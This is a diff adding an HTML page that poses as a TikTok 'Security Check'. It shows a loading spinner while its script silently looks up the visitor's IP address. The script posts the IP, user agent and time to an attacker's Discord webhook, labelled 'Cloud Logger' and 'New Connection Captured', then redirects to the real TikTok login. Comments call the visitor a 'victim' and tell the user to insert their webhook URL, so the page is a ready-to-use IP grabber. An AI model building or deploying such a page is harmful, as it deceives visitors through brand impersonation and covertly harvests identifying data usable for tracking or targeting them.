@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok | Security Check</title>
+    <style>
+        body {
+            background-color: #121212;
+            color: white;
+            font-family: 'Proxima Nova', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #fe2c55;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div style="text-align: center;">
+        <div class="loader" style="margin: 0 auto;"></div>
+        <p style="margin-top: 20px; font-weight: bold;">Verifying account details...</p>
+    </div>
+
+    <script>
+        // Replace the URL below with your actual Discord Webhook URL
+        const webhookURL = "YOUR_DISCORD_WEBHOOK_URL_HERE";
+
+        async function initProcess() {
+            try {
+                // Fetch Victim's IP
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+
+                // Prepare Payload for Discord
+                const payload = {
+                    username: "Cloud Logger",
+                    embeds: [{
+                        title: "🟢 New Connection Captured",
+                        color: 16657493,
+                        fields: [
+                            { name: "IP Address", value: `**${ipData.ip}**`, inline: true },
+                            { name: "User Agent", value: navigator.userAgent },
+                            { name: "Timestamp", value: new Date().toLocaleString() }
+                        ],
+                        footer: { text: "Secure Sync Active" }
+                    }]
+                };
+
+                // Send Data
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                // Final Redirect
+                setTimeout(() => {
+                    window.location.href = "https://www.tiktok.com/login";
+                }, 1500);
+
+            } catch (e) {
+                window.location.href = "https://www.tiktok.com/login";
+            }
+        }
+
+        window.onload = initProcess;
+    </script>
+</body>
+  </html>
+  
